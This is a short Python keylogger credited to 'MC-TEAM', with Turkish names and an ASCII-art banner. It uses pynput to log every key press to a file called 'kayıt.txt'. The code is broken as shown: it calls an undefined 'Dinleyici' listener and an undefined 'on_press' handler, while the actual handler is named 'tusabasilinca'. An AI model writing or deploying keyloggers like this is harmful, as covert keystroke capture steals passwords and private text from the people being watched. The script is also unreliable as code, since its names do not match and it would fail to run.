#
#MC-TEAM tarafından Geliştirilmiştir
#

from pynput.keyboard import Key, Listener
import logging

print("""

 ███▄ ▄███▓ ▄████▄        ▄▄▄█████▓▓█████ ▄▄▄       ███▄ ▄███▓
▓██▒▀█▀ ██▒▒██▀ ▀█        ▓  ██▒ ▓▒▓█   ▀▒████▄    ▓██▒▀█▀ ██▒
▓██    ▓██░▒▓█    ▄       ▒ ▓██░ ▒░▒███  ▒██  ▀█▄  ▓██    ▓██░
▒██    ▒██ ▒▓▓▄ ▄██▒      ░ ▓██▓ ░ ▒▓█  ▄░██▄▄▄▄██ ▒██    ▒██ 
▒██▒   ░██▒▒ ▓███▀ ░        ▒██▒ ░ ░▒████▒▓█   ▓██▒▒██▒   ░██▒
░ ▒░   ░  ░░ ░▒ ▒  ░        ▒ ░░   ░░ ▒░ ░▒▒   ▓▒█░░ ▒░   ░  ░
░  ░      ░  ░  ▒             ░     ░ ░  ░ ▒   ▒▒ ░░  ░      ░
░      ░   ░                ░         ░    ░   ▒   ░      ░   
       ░   ░ ░                        ░  ░     ░  ░       ░   
           ░                                                  """)



clients = []

log_dir = ""
logging.basicConfig(filename=(log_dir + "kayıt.txt"), level=logging.DEBUG, format='[%(message)s]')


def tusabasilinca(key):
	logging.info(str(key))

with Dinleyici(on_press=on_press) as listener:
	listener.join()
